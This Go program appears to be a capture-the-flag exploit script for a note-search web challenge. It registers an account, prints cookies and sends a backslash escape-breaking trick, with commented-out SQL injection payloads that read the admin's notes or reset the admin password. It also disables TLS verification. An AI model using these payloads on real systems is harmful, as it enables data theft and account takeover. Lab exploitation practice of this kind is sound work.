package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"
)

func randomString(length int) string {
	letters := "abcdefghijklmnopqrstuvwxyz"
	rand.Seed(time.Now().UnixNano())
	sb := strings.Builder{}
	for i := 0; i < length; i++ {
		sb.WriteByte(letters[rand.Intn(len(letters))])
	}
	return sb.String()
}

func main() {
	base := "https://e177bfbad971d684.ctf-bsidesthehague.com"
	username := "exploit_" + randomString(6)
	password := "password123"

	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		Jar: jar,
	}

	// Register
	registerData := url.Values{}
	registerData.Set("username", username)
	registerData.Set("password", password)

	resp, err := client.PostForm(base+"/register", registerData)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	u, _ := url.Parse(base)
	cookies := jar.Cookies(u)

	for _, c := range cookies {
		fmt.Printf("Cookie: %s=%s\n", c.Name, c.Value)
	}

	fmt.Printf("User: %s / %s\n", username, password)

	// Search
	searchData := url.Values{}
	searchData.Set("title", "\\")
	// searchData.Set("tag", ") UNION SELECT id, owner, body FROM notes WHERE owner=0x61646d696e -- ")
	// searchData.Set("tag", ") LEFT JOIN (UPDATE users SET password=SHA2(CHAR(97, 100, 109, 105, 110), 256) WHERE username=CHAR(97, 100, 109, 105, 110)) -- ")
	// searchData.Set("tag", ") UNION SELECT 1,2,3 -- ")

	resp, err = client.PostForm(base+"/search", searchData)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	body := string(bodyBytes)

	fmt.Println(body)

	idx := strings.Index(body, "Results")
	if idx != -1 {
		end := idx + 300
		if end > len(body) {
			end = len(body)
		}
		fmt.Printf("    Status: %d\n", resp.StatusCode)
		fmt.Printf("    Response snippet: %s\n", body[idx:end])
	} else {
		fmt.Printf("    Status: %d\n", resp.StatusCode)
		fmt.Println("    'Results' not found in response")
	}
}
